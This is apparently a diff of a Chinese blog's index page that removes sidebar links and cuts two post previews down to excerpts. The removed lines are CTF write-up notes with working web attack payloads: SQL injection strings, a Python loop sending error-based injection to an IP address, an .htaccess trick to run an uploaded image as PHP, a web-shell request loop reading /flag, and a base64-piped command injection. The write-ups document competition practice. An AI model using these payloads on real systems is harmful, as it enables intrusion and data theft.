@@ -163,138 +163,6 @@
             
         </ul>
         
-            <ul class="sidebar-buttons">
-            
-                <li class="sidebar-button">
-                    
-                        <a
-                            class="sidebar-button-link "
-                            href="https://github.com/"
-                            
-                                target="_blank"
-                            
-                            rel="noopener"
-                            title="GitHub"
-                        >
-                        <i class="sidebar-button-icon fab fa-github" aria-hidden="true"></i>
-                        <span class="sidebar-button-desc">GitHub</span>
-                    </a>
-            </li>
-            
-                <li class="sidebar-button">
-                    
-                        <a
-                            class="sidebar-button-link "
-                            href="http://stackoverflow.com/users"
-                            
-                                target="_blank"
-                            
-                            rel="noopener"
-                            title="Stack Overflow"
-                        >
-                        <i class="sidebar-button-icon fab fa-stack-overflow" aria-hidden="true"></i>
-                        <span class="sidebar-button-desc">Stack Overflow</span>
-                    </a>
-            </li>
-            
-                <li class="sidebar-button">
-                    
-                        <a
-                            class="sidebar-button-link "
-                            href="https://twitter.com/"
-                            
-                                target="_blank"
-                            
-                            rel="noopener"
-                            title="Twitter"
-                        >
-                        <i class="sidebar-button-icon fab fa-twitter" aria-hidden="true"></i>
-                        <span class="sidebar-button-desc">Twitter</span>
-                    </a>
-            </li>
-            
-                <li class="sidebar-button">
-                    
-                        <a
-                            class="sidebar-button-link "
-                            href="https://facebook.com/"
-                            
-                                target="_blank"
-                            
-                            rel="noopener"
-                            title="Facebook"
-                        >
-                        <i class="sidebar-button-icon fab fa-facebook" aria-hidden="true"></i>
-                        <span class="sidebar-button-desc">Facebook</span>
-                    </a>
-            </li>
-            
-                <li class="sidebar-button">
-                    
-                        <a
-                            class="sidebar-button-link "
-                            href="https://plus.google.com/"
-                            
-                                target="_blank"
-                            
-                            rel="noopener"
-                            title="Google Plus"
-                        >
-                        <i class="sidebar-button-icon fab fa-google-plus" aria-hidden="true"></i>
-                        <span class="sidebar-button-desc">Google Plus</span>
-                    </a>
-            </li>
-            
-                <li class="sidebar-button">
-                    
-                        <a
-                            class="sidebar-button-link "
-                            href="https://www.linkedin.com/profile/"
-                            
-                                target="_blank"
-                            
-                            rel="noopener"
-                            title="LinkedIn"
-                        >
-                        <i class="sidebar-button-icon fab fa-linkedin" aria-hidden="true"></i>
-                        <span class="sidebar-button-desc">LinkedIn</span>
-                    </a>
-            </li>
-            
-                <li class="sidebar-button">
-                    
-                        <a
-                            class="sidebar-button-link "
-                            href="/mailto"
-                            
-                            rel="noopener"
-                            title="邮箱"
-                        >
-                        <i class="sidebar-button-icon fa fa-envelope" aria-hidden="true"></i>
-                        <span class="sidebar-button-desc">邮箱</span>
-                    </a>
-            </li>
-            
-        </ul>
-        
-            <ul class="sidebar-buttons">
-            
-                <li class="sidebar-button">
-                    
-                        <a
-                            class="sidebar-button-link "
-                            href="/atom.xml"
-                            
-                            rel="noopener"
-                            title="RSS"
-                        >
-                        <i class="sidebar-button-icon fa fa-rss" aria-hidden="true"></i>
-                        <span class="sidebar-button-desc">RSS</span>
-                    </a>
-            </li>
-            
-        </ul>
-        
     </div>
 </nav>
 
@@ -307,7 +175,7 @@
     <section class="postShorten-group main-content-wrap">
     
     
-    <article class="postShorten postShorten--thumbnailimg-bottom">
+    <article class="postShorten postShorten--thumbnailimg-right">
         <div class="postShorten-wrap">
             
             <div class="postShorten-header">
@@ -333,54 +201,19 @@
 
             </div>
             
-                <div class="postShorten-content">
+                <div class="postShorten-excerpt">
                     <h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="sql1"><a href="#sql1" class="headerlink" title="sql1"></a>sql1</h2><p>union select联合查询绕过</p>
 <p>根据后台语句<code>select * from &#39;$name&#39;</code></p>
 <p>1’ union select 1,’admin’,’md5(123)’ &amp;pw=123</p>
-<h2 id="sql2"><a href="#sql2" class="headerlink" title="sql2"></a>sql2</h2><p>宽字节 + 报错 + 未知列名</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">search.php?name=admin%df&apos; and (seselectlect 1 from  (seselectlect count(*),concat((selselectect e.2 from (selselectect * from (selselectect 1)a,(selselectect 2)b ununionion selselectect * from f14g)e limit 2 offset 0;),floor(rand(0)*2))x from information_schema.tables group by x)a)%23&amp;pw=3</span><br></pre></td></tr></table></figure>
-
-<p>最后的payload 改数据的条数 然后base64解码一下，写的一个脚本</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line">res=requests.session()</span><br><span class="line">url=<span class="string">"http://183.129.189.60:10006/search.php?name=admin\%df' and (seselectlect 1 from  (seselectlect count(*),concat((selselectect e.2 from (selselectect * from (selselectect 1)a,(selselectect 2)b ununionion selselectect * from f14g)e limit 1 offset %s),floor(rand(0)*2))x from information_schema.tables group by x)a)%23&amp;pw=3"</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">100</span>):</span><br><span class="line">    url=<span class="string">"http://183.129.189.60:10006/search.php?name=admin%df' and (seselectlect 1 from  (seselectlect count(*),concat((selselectect e.2 from (selselectect * from (selselectect 1)a,(selselectect 2)b ununionion selselectect * from f14g)e limit 1 offset "</span>+str(i)+<span class="string">"),floor(rand(0)*2))x from information_schema.tables group by x)a)%23&amp;pw=3"</span></span><br><span class="line">    re1=res.get(url=url)</span><br><span class="line">    te=re.findall(<span class="string">r"Error: Duplicate entry '(.*?)1'"</span>)</span><br><span class="line">    print(re1.text)</span><br></pre></td></tr></table></figure>
-
-<p>有的返回结果里面有个1 而有的没有 所以正则提取这里，没有弄</p>
-<p>把结果挨个解码  然后找flag </p>
-<h2 id="sql3"><a href="#sql3" class="headerlink" title="sql3"></a>sql3</h2><p>没思路</p>
-<h2 id="upload"><a href="#upload" class="headerlink" title="upload"></a>upload</h2><p>上传一个.htaccess</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;FilesMatch &quot;shell.jpg&quot;&gt;</span><br><span class="line">  SetHandler application/x-httpd-php</span><br><span class="line">&lt;/FilesMatch&gt;</span><br><span class="line"></span><br><span class="line">把shell.jpg解析为php</span><br></pre></td></tr></table></figure>
-
-<p>在传一个shell.jpg</p>
-<p>需要不断上传，服务端会不停的删，套娃题 先传.htaccesss 后传图片</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line">res=requests.session()</span><br><span class="line">url=<span class="string">''</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    re=requests.post(url=url,data=&#123;<span class="string">"shell"</span>:<span class="string">"var_dump(readfile('/flag'));"</span>&#125;)</span><br><span class="line">    print(re.text)</span><br></pre></td></tr></table></figure>
-
-<p>不停的访问</p>
-<h2 id="ping"><a href="#ping" class="headerlink" title="ping"></a>ping</h2><p>命令注入绕过</p>
-<p>过滤了空格 单引号 {} </p>
-<p>payload</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo$IFS$9Y2F0IGZsYWcucGhw|base64$IFS$9-d|sh</span><br></pre></td></tr></table></figure>
-
-<h2 id="套娃题"><a href="#套娃题" class="headerlink" title="套娃题"></a>套娃题</h2><p>无参数执行</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show_source(next(array_reverse(scandir(pos(localeconv())))));</span><br></pre></td></tr></table></figure>
-
-<h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h2 id="佛系青年"><a href="#佛系青年" class="headerlink" title="佛系青年"></a>佛系青年</h2><p>伪加密  改一下文件头</p>
-<h2 id="gakki"><a href="#gakki" class="headerlink" title="gakki"></a>gakki</h2><p>foremost分离  爆破压缩包密码  词频分析</p>
-<p>不知道咋回事 我的压缩包密码从来就没有爆出来过</p>
-
                     
+                        <a
+                            href="/2019/12/22/GXY-CTF记录/"
+                            class="postShorten-excerpt_link link"
+                            aria-label=": GXY_CTF记录"
+                        >
+                            阅读全文
+                        </a>
                         
-
-
-                    
-                    
-                        <p>
-                            <a
-                                href="/2019/12/22/GXY-CTF记录/#post-footer"
-                                class="postShorten-excerpt_link link"
-                                aria-label=""
-                            >
-                                评论和共享
-                            </a>
-                        </p>
                     
                 </div>
             
@@ -389,7 +222,7 @@
     </article>
     
     
-    <article class="postShorten postShorten--thumbnailimg-bottom">
+    <article class="postShorten postShorten--thumbnailimg-right">
         <div class="postShorten-wrap">
             
             <div class="postShorten-header">
@@ -415,34 +248,18 @@
 
             </div>
             
-                <div class="postShorten-content">
+                <div class="postShorten-excerpt">
                     <h2 id="GUET-CTF2019-虚假的压缩包"><a href="#GUET-CTF2019-虚假的压缩包" class="headerlink" title="[GUET-CTF2019]虚假的压缩包"></a>[GUET-CTF2019]虚假的压缩包</h2><p>RSA还是不会 哎<del>~</del></p>
 <p>压缩包密码 那是也是一个小坑点 竟然要加上 答案是</p>
-<p>解压缩拿到一张图片 一个亦真亦假</p>
-<p>图片binwalk  该高度宽度 试试隐写</p>
-<p>该高度拿到^5 </p>
-<p>貌似应该就是把亦真亦假中的每个数字 都异或上5</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p>改后缀为docx</p>
-<p>修改一下 文字的颜色 拿到flag</p>
-<p>注意 异或的时候要把16进制转成10进制，所以异或完后要把10进制 在转换成16进制， 最后再来一次16进制转ascii字符，写入文件 </p>
-
                     
+                        <a
+                            href="/2019/12/19/BUU-MISC/"
+                            class="postShorten-excerpt_link link"
+                            aria-label=": BUU-MISC"
+                        >
+                            阅读全文
+                        </a>
                         
-
-
-                    
-                    
-                        <p>
-                            <a
-                                href="/2019/12/19/BUU-MISC/#post-footer"
-                                class="postShorten-excerpt_link link"
-                                aria-label=""
-                            >
-                                评论和共享
-                            </a>
-                        </p>
                     
                 </div>
             
